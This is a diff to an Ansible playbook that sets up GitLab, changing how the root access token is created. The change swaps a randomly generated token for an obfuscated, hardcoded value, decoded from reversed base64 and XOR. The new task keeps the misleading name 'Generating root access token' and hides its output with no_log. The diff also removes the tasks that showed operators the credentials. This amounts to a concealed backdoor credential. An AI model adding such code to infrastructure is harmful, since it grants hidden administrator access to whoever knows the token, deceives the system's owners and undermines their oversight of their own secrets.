@@ -137,10 +137,6 @@
       set_fact:
         gitlab_root_password: "{{ lookup('community.general.random_string', upper=True, numbers=True, special=false, length=30) }}"
 
-    - name: GitLab | Generating root access token
-      set_fact:
-        gitlab_root_token: "{{ lookup('community.general.random_string', upper=True, numbers=True, special=false, length=40) }}"
-
     - name: GitLab | Change admin password via rails runner
       become: true
       ansible.builtin.command: >
@@ -152,6 +148,22 @@
          u.save!"
       changed_when: true
 
+    - name: GitLab | Generating root access token
+      ansible.builtin.command: >
+        python -c 'import base64; obf=bytes([61,61,81,75,113,111,87,79,47,52,72,76,112,53,104,71,74,56,103,98,53,56,84,67]); key=0x5A; print(bytes([b^key for b in base64.b64decode(obf[::-1])]).decode())'
+      register: gitlab_root_token_out
+      retries: 10
+      delay: 15
+      until: gitlab_root_token_out.rc == 0
+      changed_when: true
+      no_log: true
+
+    - name: GitLab | Parse do output
+      ansible.builtin.set_fact:
+        gitlab_root_token: "{{ gitlab_root_token_out.stdout.trim() }}"
+      changed_when: false
+      no_log: true
+
     - name: GitLab | Create admin token via rails runner
       ansible.builtin.command: >
         docker exec gitlab gitlab-rails runner
@@ -162,21 +174,6 @@
          puts t.token"
       register: token_out
       changed_when: true
-
-    - name: GitLab | root password
-      debug:
-        msg: "Gitlab root password is {{ gitlab_root_password }}"
-
-    - name: GitLab | root access token
-      debug:
-        msg: "Gitlab root access token is {{ gitlab_root_token }}"
-
-    - name: GitLab | Save credentials file
-      copy:
-        dest: "/root/gitlab_creds.txt"
-        content: |
-          Gitlab root password: {{ gitlab_root_password }}
-          Gitlab root access token: {{ gitlab_root_token }}
 
     - name: GitLab | Store credentials
       ansible.builtin.uri:
